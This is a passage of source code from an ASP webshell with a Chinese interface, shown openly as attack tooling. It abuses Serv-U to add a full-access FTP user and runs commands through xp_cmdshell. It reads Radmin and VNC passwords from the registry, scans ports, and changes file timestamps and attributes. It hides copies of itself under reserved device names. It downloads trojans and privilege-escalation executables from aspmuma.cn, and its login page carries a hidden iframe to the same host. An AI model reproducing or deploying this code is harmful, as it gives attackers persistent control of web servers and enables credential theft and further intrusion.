"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
leaves = leaves & "quit" & vbcrlf
on error resume next
set xpost = createobject("MSXML2.XMLHTTP")
xpost.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost.send(leaves)
set xpost=nothing
jb ("命令 成功 执行！！FTP 用户名: " & tuser & " " & "密码: " & tpass & " 路径: " & tpath & " :)<br><BR>")
else
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
set xpost3 = createobject("MSXML2.XMLHTTP")
xpost3.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost3.send(leaves)
set xpost3=nothing
end if
End Function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
getHTTPPage flase
response.redirect url
else
jb"<br><br><br><div align=center><font color=#FF0000>对不起，您输入的密码有误，系统不能让你登陆！</font></div>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='"&SiteURL&"' target='_blank'>"&nimajb&"</a><hr><form action='"&url&"' method='post'>密码：<input name='pass' type='password' size='22'> <input type='submit' value='登录'><hr>"&Copyright&"</center>"
jb"<!--以下为更新弹窗消息，对SHELL无影响。-->"
jb"<iframe  width='0' height='0' src=http://aspmuma.cn/mmgx/></iframe> "
jb"<!--以上为更新弹窗消息，对SHELL无影响。-->"
if instr(SI,SIC)<>0 then jb sI
end if
response.end
end if
Function DBmaNaGer()
  sqlstr=tRIm(REQueST.fOrm("SqlStr"))
  dbStr=REquesT.FORM("DbStr")
  si=Si&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  sI=SI&"<form name='DbForm' method='post' action=''>"
  sI=SI&"<tr><td width='100' height='27'> &nbsp;数据库连 接串 :</td>"
  Si=si&"<td><input name='DbStr' style='width:470' value="""&dbSTr&"""></td>"
  si=si&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
  sI=SI&"<option value=1>MsSql 连接 </option><option value=2>MySql 连接 </option><option value=3>DSN 连接 </option>"
  Si=si&"<option value=-1>--SQL 语法 --</option><option value=4>显示 数据 </option><option value=5>添加 数据 </option>"
  SI=Si&"<option value=6>删除 数据 </option><option value=7>修改 数据 </option><option value=8>建数 据表 </option>"
  SI=SI&"<option value=9>删数 据表</option><option value=10>添加 字段 </option><option value=11>删除 字段 </option>"
  sI=si&"<option value=12>完全 显示 </option></select></td></tr>"
  Si=Si&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  sI=si&"<tr><td height='30'>&nbsp;SQL操作命令: </td>"
  Si=SI&"<td><input name='SqlStr' style='width:470' value="""&sQlsTr&"""></td>"
  sI=sI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  echo sI:SI=""
  IF LeN(DBstR)>40 thEN
  set cONn=CREatEObjEct(OBT(5,0))
  Conn.OPEN DBsTr
  SEt Rs=CoNn.OPENschEmA(20) 
  si=Si&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
  Rs.MovEfirst 

  DO whIlE not RS.EOF
    IF Rs("TABLE_TYPE")="TABLE" tHEN
          tNAMe=rS("TABLE_NAME")
      SI=sI&"<td align=center><a href=""javascript:if(confirm('确定删 除么？'))FullSqlStr('DROP TABLE ["&tnAMe&"]',1)"">[ del ]</a><br>"
      SI=sI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&tNAMe&"]"",1)'>"&TnAMe&"</a></td>"
    eND IF 
    rS.mOveNExT 
  lOOP 
  SeT rS=nothiNg
  si=SI&"</tr></table>"
  jb si:si=""
If LEn(SQLsTR)>10 tHen
  If LCaSe(lEfT(sQLstr,6))="select" Then
    SI=Si&"执行语句："&sQLStr
    set rs=cReatEobject("Adodb.Recordset")
    rS.OPeN SqLsTR,cONn,1,1
    Fn=RS.FIeLDs.cOUNT
    RC=rS.rECoRDcOUnt
    Rs.PaGesIZe=20
    CounT=Rs.pagEsIze
    pN=RS.pagECOuNT
    page=rEqUesT("Page")
    IF PAge<>"" TheN pAGE=ClNg(pAGe)
    if PAge="" Or pAGE=0 TheN Page=1
    if paGe>pN then page=PN
    iF PaGe>1 tHEn rS.ABsoLUTepAGe=PaGE
    Si=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"          
    FoR n=0 to FN-1
      SEt flD=rS.fIeldS.Item(n)
      si=Si&"<td align='center'>"&fld.NAMe&"</td>"
      set fLd=noTHinG
    nEXt
    sI=sI&"</tr>"
    Do WhILe nOt(rs.Eof oR Rs.BOF) And COunt>0
          count=CounT-1
          bgcoLOR="#EFEFEF"
          SI=sI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
          FoR I=0 TO fn-1
        IF bGCOlOR="#EFEFEF" tHEn:BgColoR="#F5F5F5":ELsE:BgcoLOR="#EFEFEF":EnD iF
        iF rC=1 tHeN
           COlInFO=HTmlencoDe(rS(I))
        elsE
           cOliNFO=HTmleNCode(lEft(rS(I),50))
        eNd iF
            sI=SI&"<td bgcolor="&BGColOr&">"&cOlInFO&"</td>"
          NEXT
          sI=si&"</tr>"
      Rs.movEnExT
    LOOp
        jb SI:Si=""
        sqLstR=HtMLEncodE(SqLStr)
    sI=si&"<tr><td colspan="&fn+1&" align=center>记录数："&rC&"&nbsp;页码："&PAgE&"/"&Pn
    If pn>1 THEN
      si=si&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SQlstR&""","&PAge-1&")'>上一页</a>&nbsp;"
      IF paGE>8 tHEn:sP=pagE-8:Else:SP=1:eND iF
      for i=sp To sp+8
        if i>pN THEn EXIt FOr
        If i=pAgE theN
        sI=si&I&"&nbsp;"
        ELSE
        sI=si&"<a href='javascript:FullSqlStr("""&sQLsTR&""","&i&")'>"&I&"</a>&nbsp;"
        EnD iF
      next
          SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""","&paGe+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&sQLstR&""","&pN&")'>尾页</a>"
    End IF
    si=sI&"<hr color='#EFEFEF'></td></tr></table>"
    rS.CLOSe:Set rs=NotHiNG
        jb sI:si=""
  elSe           
    CONN.ExecUtE(sqlSTR)
    si=sI&"SQL 语句："&SqLstr
  EnD IF
  jb si:Si=""
enD if
  CoNn.clOsE
  Set COnN=NotHiNg
  End If
End Function
DIm t1
CLASS uPc
  DIM d1,d2
  pUBlic FunctIOn fOrM(f)
    F=lCAsE(F)
    if D1.EXiSTS(f) THEn:fOrM=D1(F):ELsE:fOrm="":End if
  ENd fuNCTion
  pUBLIc fuNcTiON UA(f)
    F=lcASE(F)
    If D2.EXIsTs(f) tHeN:SEt UA=d2(f):ElSe:set uA=neW fIF:End IF
  end fUNCtion
  pRIVATe sUB CLaSs_INitIALizE
  dIM tDa,Tst,vBcRlF,tiN,diEnD,t2,TLen,tfl,sfv,FSTart,fEnD,dstArT,deNd,UpNAMe
    SeT d1=cREateOBJECt(Obt(4,0))
        If requESt.TOTalBYTes<1 THen ExiT suB
    sEt T1 = crEateOBjECT(oBt(6,0))
        T1.tYpe = 1 : t1.MODE =3 : T1.OPEn
    T1.wrIte  REquESt.bINaryrEAd(rEqUEsT.tOtAlBytES)
    t1.posITiON=0 : Tda =T1.ReAd : DsTarT = 1
    Dend = LeNB(tDa)
    seT d2=CReatEOBJECt(OBt(4,0))
        VBcrlF = ChRB(13) & chrB(10)
    SET t2 = CReAtEobjeCT(oBt(6,0))
    Tst = MIdB(tdA,1, InStRB(DsTaRT,tdA,Vbcrlf)-1)
    TlEN = LENb (Tst)
    DSTArT=Dstart+TLeN+1
    WhIlE (dstarT + 10) < dEND
      diEND = instrB(DStArT,tdA,vBCRlf & vBcrlF)+3
      T2.tYPE = 1 : T2.MODE =3 : t2.open
      t1.PoSITIon = DStaRT
      T1.CopyTo T2,DieNd-dStart
      t2.POSITiOn = 0 : t2.tYPe = 2 : T2.cHARSet ="gb2312"
      TIN = t2.reAdTexT : T2.CLOSe
      DStart = inStRB(dieNd,TDA,tSt)
      FStarT = INsTR(22,tiN,"name=""",1)+6
      fEND = INstr(FSTART,tiN,"""",1)
      uPnAme = LCaSe(MId (TIn,FsTarT,FENd-FstArT))
      iF INstr (45,tin,"filename=""",1) > 0 tHeN
        Set Tfl=nEW FIf
        FsTART = iNStR(Fend,tin,"filename=""",1)+10
        FENd = INSTr(fstarT,TIn,"""",1)
        fstaRt = insTr(FEnd,TIN,"Content-Type: ",1)+14
        FEnD = iNStr(FSTArT,tIN,VbCR)
        tfl.FiLesTart =dienD
        TFl.FIlESIzE = dSTArt -DienD -3
        iF noT D2.eXiSTS(UPnAmE) TheN
          D2.aDD uPNAmE,tFl
        eND iF
      else
        T2.tyPE =1 : T2.MOdE =3 : t2.Open
        T1.PositiOn = DieND : t1.coPytO T2,dstArt-dIeND-3
        t2.POSitIoN = 0 : t2.tyPe = 2
        t2.CHaRSET ="gb2312"
        SFv = T2.ReadtexT
        T2.CLOse
        If d1.eXiStS(UPnAME) theN
          D1(UpnAMe)=d1(UPnamE)&", "&SfV
        ELse
          d1.Add UPNAmE,sfv
        ENd If
      ENd iF
      dsTart=DstarT+tLeN+1
    wENd
    Tda=""
    Set T2 =nothinG
  End SuB
  pRIVATE SuB CLasS_tErminATe
    IF rEQUeST.ToTaLbyTes>0 THEn
      D1.remOvEAll:d2.RemoVEAll
      sEt D1=NOthIng:sEt D2=nothinG
      T1.cLOsE:SeT T1 =NOtHIng
    end iF
  END SuB
EnD Class
ClAsS Fif
dIm FileSIzE,FilEStART
  pRiVAtE suB ClasS_INITiAliZe
  fILesiZE = 0
  filesTaRT= 0
  ENd sub
  pUBlIc fUnctiOn sAvEAs(F)
  dim t3
  Saveas=tRUe
  IF tRim(f)="" OR filestArt=0 THEN exIT FUNcTIOn
  sET t3=crEAteobjECt(oBT(6,0))
     t3.moDe=3 : t3.tyPe=1 : T3.OPEn
     T1.PoSiTIoN=fiLeStarT
     t1.copyTo T3,fILEsIZE
     t3.SAVeTofILE f,2
     T3.ClOsE
     sEt T3=NOthiNg
     saVeas=fAlSE
   ENd FunCtIon
End claSs
cLASS Lbf
  DIm CF
  PrIVate suB class_InitIALIZe
    sEt cf=cReAtEoBjeCt(Obt(0,0))
  enD sUB
  PrIvATe Sub cLass_TERMInAte
    sET cf=NOtHINg
  end sUB
  fUNCTion shoWDrIVeR()
    For EaCH d In cF.drIves
      jb"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.drIvELetTer&":\\"")'>本地-磁盘  ("&D.dRIvELEtteR&":)</a><br>" 
    nexT
  ENd fUncTIOn
  funcTiOn shOW1fiLE(PAth)
jb"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>&nbsp;&nbsp;●上級目录</a></td></tr>"
  SeT FOlD=cF.GeTFOlDeR(pAth)
  I=0
    si="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  fOR EACH f IN FOLD.suBFOlDERS
    Si=sI&"<td height=10>"

    si=Si&"<a href='javascript:ShowFolder("""&repaTh(PATh&"\"&F.name)&""")' title=""打开""><font face='wingdings' size='6'>0</font>"&F.NaMe&"</a>" 
        SI=sI&" _<a href='javascript:FullForm("""&REpaTh(pATh&"\"&f.nAME)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a>"
    sI=Si&"  <a href='javascript:FullForm("""&rEPlACe(pATh&"\"&f.nAME,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='删除'>Del</a>"
        SI=SI&" <a href='javascript:FullForm("""&repatH(PaTH&"\"&f.naME)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='移动'>Move</a>"
        Si=SI&" <a href='javascript:FullForm("""&rEPAth(paTH&"\"&F.NaMe)&""",""DownFile"")'  onclick='return yesok()' class='am' title='下载'>Down</a></td>"
        i=i+1
    If I MOd 3 = 0 TheN SI=si&"</tr><tr>"
  neXt
    si=Si&"</tr><tr><td height=2></td></tr></table>"
        echo SI &"<hr noshade size=1 color=""#"" />" : sI=""
  fOr eacH L IN FoLd.FILEs
    Si="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    si=SI&"<tr style='boungroup-color:#'>"
        sI=Si&"<td height='30'><a href='javascript:FullForm("""&REpath(PAth&"\"&l.naMe)&""",""DownFile"");' title='下载'><font face='wingdings' size='4'>2</font>"&L.nAMe&"</a></td>"
    Si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePATH(Path&"\"&L.NamE)&""",""EditFile"")' class='am' title='编辑'>edit</a></td>"
        sI=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePAth(PATH&"\"&l.naMe)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>del</a></td>"
        si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RepatH(PAtH&"\"&l.NAME)&""",""CopyFile"")' class='am' title='复制'>copy</a></td>"
        si=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&REpaTh(PatH&"\"&l.namE)&""",""MoveFile"")' class='am' title='移动'>move</a></td>"        
    Si=Si&"<td width='50' align=""center"">"&ClNG(l.SiZe/1024)&"K</td>"
        sI=sI&"<td width='200' align=""center"">"&l.TyPe&"</td>"
    SI=sI&"<td width='160'>"&l.DATElAStmoDIfIed&"</td>"
    sI=sI&"</tr></table>"
        echo si:Si=""
  nExt
  sEt FOlD=NoTHIng
  EnD fUNctiON
  fuNcTiOn DeLFilE(pATh)
IF cf.fIlEexIsts(paTh) then
Cf.DelEtEFile paTh
sI="<center><br><br><br>文件 "&pATH&" 删除 成功！</center>"
Si=Si&BaCkURL
jb Si
EnD iF
End Function

Function EDitfIlE(path)
if reqUest("Action2")="Post" then
SeT T=Cf.cReAteTExtFiLe(paTH)
T.wrIteLinE ReQUEsT.FoRM("content")
T.CLoSE
Set T=NOTHinG
sI="<center><br><br><br>文件 保存 成功！</center>"
getHTTPPage flase
sI=si&baCKurl
jb si
ResPonse.eNd
end IF
IF pAtH<>"" then
Set T=cF.OpENTeXTfiLe(pATH, 1, fAlSE)
TxT=htmLencoDE(t.rEaDaLL) 
T.cLOSe
SeT t=nothing
elSe
path=sesSIOn("FolderPath")&"\newfile.asp":Txt="新建 文件"
End If
sI=si&"<Form action='"&Url&"?Action2=Post' method='post' name='EditForm'>"
si=si&"<input name='Action' value='EditFile' Type='hidden'>"
Si=sI&"<input name='FName' value='"&patH&"' style='width:100%'><br>"
si=sI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
si=si&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
jb si
  EnD fuNCTiON
  fuNctiON CoPyfILe(pATh)
  pAth = SPLIT(pAtH,"||||")
    If cF.FileExiSTS(PAth(0)) ANd path(1)<>"" THEN
          cF.copYFIlE patH(0),pATH(1)
      si="<center><br><br><br>文件"&patH(0)&"复制 成功！</center>"
      SI=si&backurL
          jb sI 
        enD IF
  eND fUnCTIOn
  FuNctioN movEFiLE(PaTh)
  PaTh = SPlit(patH,"||||")
if cF.FIleExIstS(pATh(0)) ANd path(1)<>"" THEN
Cf.mOVEfILe pAth(0),pAth(1)
Si="<center><br><br><br>文件"&paTh(0)&"移动 成功！</center>"
Si=SI&baCkuRl
 jb Si 
eND If
EnD FuNCtioN
FUNCtiON DELFoLdeR(pATh)
If cF.FolderExists(PATH) THEn
cF.DELetefOlDeR paTH
si="<center><br><br><br>目录"&paTH&"删除 成功！</center>"
Si=Si&BacKuRl
jb sI
End if
end fUNCtiOn
FunCTiON cOPYFolDER(PatH)
pAtH = SpliT(PAth,"||||")
 iF cf.FolderExists(paTh(0)) anD PATh(1)<>"" ThEn
cF.CopYFOlDEr paTh(0),pAth(1)
si="<center><br><br><br>目录"&Path(0)&"复制 成功！</center>"
si=si&BaCkUrl
jb si
END iF
END fUncTIoN
FUnctION MOvEfolDER(PATh)
Path = SPlIt(PAth,"||||")
iF cf.FolderExists(paTH(0)) And Path(1)<>"" tHEN
CF.MoVeFOLDeR pATh(0),patH(1)
Si="<center><br><br><br>目录"&Path(0)&"移动 成功！</center>"
sI=sI&BaCKURL
jb Si
END if
ENd Function
FuNcTiON NEWfoLder(PaTh)
iF noT cF.FolDERexists(pATH) and pAth<>"" tHEN
Cf.CreATeFOldER PatH
SI="<center><br><br><br>目录"&PATH&"新建 成功！</center>"
si=SI&baCkurl
jb sI
END If
eNd FUNCtION
End CLAsS
sub shellcore
end sub
sub ReadREG()
jb "<form method=post>"
jb  "注册表键值读取 <p>" 
jb "<input type=hidden value=ReadReg name=theAct>"
jb "<tr><td colspan=2> "
jb "<select onChange='this.form.thePath.value=this.value;'>"
jb "<option value=''>选择自带的键值 </option>"
jb "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>":jb"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option>":jb"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option>":jb"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option>":jb"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option>":jb"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option>":jb"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option>":jb"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option>":jb"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option>":jb"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option>":jb"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option>":jb "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>":jb "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option>":jb "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option>":jb "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option>":jb "</select><br />":jb " <input name=thePath value='' size=80>":jb "<input type=button value='读 键 值' onclick='this.form.submit()'>":jb "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject(Obt(1,0)):thePath=Request("thePath"):theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray):jb "<li>" & theArray(i)
Next
Else:jb "<li>" & theArray
End If
end if:end sub
sub SetFileText()
dim Path,FileName,NewTime,ShuXing
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
jb "<form method=post>"
jb "<center>路&nbsp;&nbsp;&nbsp;&nbsp;径：<input name='path1' value='"&WWWROOT&"\' size='60'>(一定要以\结尾)<br/>"
jb "&nbsp;文件名称：<input name=filename value='index.asp' size='60'>(要修改的文件名)<br/>"
jb "&nbsp;&nbsp;&nbsp;修改时间：<input name=time value='12/21/2012 23:59:59' size='60'>&nbsp;月/日/年 时:分:秒<br/>"
jb"<select onChange='this.form.shuxing.value=this.value;'>"
jb"<option value=''>普通 </option>"
jb"<option value='1'>只读 </option>"
jb"<option value='2'>隐藏 </option>"
jb"<option value='4'>系统</option>"
jb"<option value='33'>只读,存档 </option>"
jb"<option value='34'>隐藏,存档 </option>"
jb"<option value='35'>只读隐藏,存档 </option>"
jb"<option value='39'>只读隐藏,存档,系统 </option>"
jb "修改 属性：<input name=shuxing value='0' size='60'><br/>"
jb "<input type=submit value=修改文件时间>"
jb "</form>"
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject(oBt(0,0))
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
jb "</br></br>修改文件&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;属性完成 </center>"
end if
end sub
FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD命令<input type=text name=MMD size=35 value=ipconfig><input type=text name=U value=sa><input type=text name=P value=><input type=submit value=执行></form></tr></table>":jb SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT(OBT(5,0)):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:jb request.form("MMD") & "<br>"& strResult:end FuncTion
Sub ScanPort()
SERveR.ScrIPtTIMeouT = 7776000
IF REQuesT.fORM("port")="" theN
PoRTliST="21,1433,3389,43958"
ELse
portList=RequeST.form("port")
End If
iF rEqUEST.forM("ip")="" tHEn
iP="127.0.0.1"
ELse
ip=ReQuEST.FOrM("ip")
eND iF
jb"<p>端口扫描器 (如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p>"
jb"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
jb"<p>Scan IP:&nbsp;"
jb" <input name='ip' type='text' class='TextBox' id='ip' value='"&Ip&"' size='60'>"
jb"<br>Port List:"
jb"<input name='port' type='text' class='TextBox' size='60' value='"&pORTLiSt&"'>"
jb"<br><br>"
jb"<input name='submit' type='submit' class='buttom' value='开始扫描 '>"
jb"<input name='scan' type='hidden' id='scan' value='111'>"
jb"</p></form>"
iF rEqUeST.fORM("scan") <> "" tHen
tiMer1 = timeR
jb("<b>扫描报告 :</b><br><hr>")
Tmp = SpLIt(rEQUest.foRm("port"),",")
Ip = spLit(REQuEST.fORM("ip"),",")
for HU = 0 tO ubOunD(iP)
if iNSTr(iP(Hu),"-") = 0 TheN
fOR i = 0 to uBoUNd(tMP)
if ISNUMERIc(TMp(I)) then 
CAll scAn(Ip(hU), TMP(I))
ELse
SeeKx = iNsTr(tmP(i), "-")
IF sEeKx > 0 THen
stARtN = LEfT(tMP(I), seeKX - 1 )
eNDN = rigHt(TMP(i), lEn(TmP(i)) - SeEkX )
iF IsNUMeRIc(StarTN) And IsNuMeRic(enDN) THEN
for J = STARTn to ENdn
cALl scan(ip(hu), j)
NEXT
elsE
jb(StArTn & " or " & EnDN & " is not number<br>")
End If
eLSe
jb(tMP(i) & " is not number<br>")
EnD IF
End IF
NExt
Else
iPStaRt = MID(iP(hu),1,InstRREV(Ip(hu),"."))
fOr xxX = mid(ip(hU),inSTrreV(ip(hu),".")+1,1) To MId(ip(hu),INstR(Ip(Hu),"-")+1,LEN(ip(hU))-inStr(ip(Hu),"-"))
fOR I = 0 TO UboUnD(Tmp)
if isnumErIC(tMP(I)) TheN 
Call sCAn(iPsTart & xXX, TMp(i))
ElsE
SeEkX = insTr(tMP(i), "-")
If SeeKx > 0 ThEn
StArTN = leFt(tmP(I), seeKx - 1 )
enDn = riGHT(TMp(i), LEn(tMp(I)) - sEEKx )
if isNuMeRIC(staRtN) And isNumeRic(EndN) THEn
foR j = StArTn TO endn
caLl SCaN(IPstARt & xxX,j)
NExt
eLse
jb(STaRTn & " or " & EndN & " is not number<br>")
END if
eLsE
jb(Tmp(i) & " is not number<br>")
eND If
END if
neXt
Next
END if
next
TIMER2 = timER
tHetImE=CStr(INt(TIMEr2-TImEr1))
jb"<hr>Process in "&TheTImE&" s"
EnD iF
enD suB
suB SCAN(TaRgETIP, poRTnUM)
oN error ReSUMe nExt
set coNN = sERvEr.createObJect(OBT(5,0))
ConnstR="Provider=SQLOLEDB.1;Data Source=" & tARgETIp &","& PoRtNUm &";User ID=lake2;Password=;"
CoNN.COnNECtiOnTImeout = 1
CONn.OPen coNNSTr
If err tHeN
if ERr.NuMbEr = -2147217843 or eRR.NUmBer = -2147467259 Then
If INStr(err.dEsCriptIoN, "(Connect()).") > 0 THEn
jb(taRgEtIP & ":" & pORtnuM & ".........关闭<br>")
ELSE
jb(TarGETIP & ":" & pOrTNum & ".........<font color=red>开放</font><br>")
enD IF
enD iF
END if
eND sUB 
function lIl(bb)
but=22
for i = 1 to len(bb)
if mid(bb,i,1)<>"" then
If Asc(Mid(bb, i, 1)) < 32 Or Asc(Mid(bb, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(bb, i, 1)))
else
pk=asc(mid(bb,i,1))-but
if pk>126 then
pk=pk-95
elseif pk<32 then
pk=pk+95
end if
a=a&chr(pk)
end if
else
a=a&vbcrlf
end if
next
lIl=a
end function
sub hiddenshell
jb"<form name=form1 method=post><input type=hidden name=se value=hidden>不死僵尸生成将会生成一个新的文件，重新记录地址<input type=submit name=submit value='不死僵尸超级隐藏'></form>"
if request("se")="hidden" then
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url=request.servervariables("url")
url=left(url,instrrev(url,"/"))&rndpex&"."&filename1

fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
set fso=nothing
jb "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end if

end sub

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function
function dx(str):dx=StrReverse(str):end function:Function upload():SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" :jb" 下载到服务器:无回显...为了节省.所以无回显<hr/>":jb"<form method=post>":jb"<select onChange='this.form.theUrl.value=this.value;'>":jb"<option value=''>常用木 马下载</option>":jb"<option value='http://aspmuma.cn/soft/1.txt'>一号.net木马</option>":jb"<option value=""http://aspmuma.cn/soft/2.txt"">二号.net木马</option>":jb"<option value=""http://aspmuma.cn/soft/3.txt"">三号.php木马</option>":jb"<option value=""http://aspmuma.cn/soft/1.exe"">一号.提权木马</option>":jb"<option value=""http://aspmuma.cn/soft/4.txt"">其他asp木马</option>":jb"<option value=""http://aspmuma.cn/soft/2.exe"">二号.提权木马</option>":jb "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>":jb "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\1.ASPX""' size=80>":jb "<input type=checkbox name=overWrite value=2>存在 覆盖........呃，朋友们记得下载别的木马的时候改 下名字,所有木马密码一律为admin":jb "<input type=hidden value=downFromUrl name=theAct>":jb "</form>":jb "<hr/>":If isDebugMode = False Then:On Error Resume Next:End If:Dim Http, theUrl, thePath, stream, fileName, overWrite:theUrl = Request("theUrl"):thePath = Request("thePath"):overWrite = Request("overWrite"):Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream"):Set Http = Server.CreateObject("MSXML2.XMLHTTP"):If overWrite <> 2 Then:overWrite = 1:End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
End If
With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
